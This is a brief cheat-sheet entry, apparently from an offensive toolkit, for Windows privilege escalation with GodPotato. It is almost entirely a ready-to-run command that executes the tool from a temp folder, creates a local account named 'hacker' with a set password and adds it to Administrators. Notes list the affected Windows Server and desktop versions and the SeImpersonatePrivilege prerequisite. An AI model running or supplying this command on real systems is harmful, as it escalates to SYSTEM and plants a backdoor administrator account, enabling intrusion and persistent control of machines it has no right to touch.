exploitation: exec <id> C:\Windows\Temp\GodPotato.exe -cmd "cmd /c net user hacker P@ssw0rd! /add && net localgroup Administrators hacker /add"
notes: Works on Windows Server 2012–2022, Windows 8–11. Requires SeImpersonatePrivilege. Upload GodPotato.exe first. Works in most IIS/MSSQL/service contexts.
